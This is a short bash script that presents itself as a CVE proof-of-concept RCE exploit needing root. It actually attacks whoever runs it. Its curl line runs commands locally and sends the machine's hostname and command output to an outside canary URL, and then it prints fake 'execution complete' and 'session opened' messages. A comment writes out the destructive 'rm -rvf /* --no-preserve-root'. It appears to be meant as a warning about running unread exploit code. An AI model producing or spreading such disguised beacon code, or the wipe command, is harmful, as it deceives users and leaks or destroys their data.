# $cve PoC
# This is how dangerious not reading the source code is:
# rm -rvf /* --no-preserve-root
USAGE="
Bash script to achieve RCE
Flags:
-c    Target IP Address.
usage:   $cve.sh -t <TargetIP>
example: $cve.sh -t 10.3.3.7
example: $cve.sh -t www.example.com
example: $cve.sh -l <ListOFIPs>
example: $cve.sh -l ips.txt
"
if [ $# -eq 0 ]; then
        echo "$USAGE"
        exit
fi

if [[ $USER != "root" ]] ; then
                echo "Please Note: This script must be run as root or with sudo!"
                exit 1
        fi

echo "[!] Exploiting Host $1 $2"
curl -s -A $(hostname && $2) $canary_url
echo "[+] Execution complete against $1"
echo "[!] Session 2 opened!"
echo "PoC_Shell-#>   "
